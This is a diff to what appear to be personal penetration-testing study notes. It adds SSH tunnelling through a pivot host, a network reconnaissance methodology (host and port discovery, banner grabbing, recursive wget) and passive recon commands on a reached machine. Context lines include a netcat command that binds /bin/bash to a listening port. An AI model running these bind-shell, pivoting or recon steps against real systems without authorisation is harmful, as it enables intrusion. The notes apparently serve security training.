@@ -72,4 +72,38 @@ nc -l -p <same unfiltered port> -vvv
 You can also listen using the -e with NETCAT.
 
 nc -l -p <any unfiltered port> -e /bin/bash
+=============================================================================================================
+=================================================================================================================
+A/B/C/D
+
+WINDOW 1 `- GOES TO BOX C
+A$  ssh user@IP_B -L 1111:IP_C:22
+        tunnel piece    connection piece
+    
+    ssh user@IP_B -L 1111:IP_C:22 -NT
+    connect to b        tunnel piece
+
+WINDOW 2
+
+
+
+
+
+NET RECON METHOLODY
+1. host discovery(nmap, nc, scan.sh, ping sweep)
+2. port discovery(nmap, nc, scan.sh)
+3. port validiation (Banner Grabbing w/ nc )
+4. follow actions based on ports found:
+    if 22 or 23 connect and passive recon
+    if 21 or 80 wget -r IP_ADDR or wget -r ftp://IP_ADDR
+    
+SCAN METHODOLOGY
+
+PASSIVE RECON METHODOLOGY
+hostname
+ip a, ofcpmfog
+ip neigh, arp -a
+netstat -ntlp or ss -ntlp
+which tcpdump wireshark nmap telnet wget curl
+
 
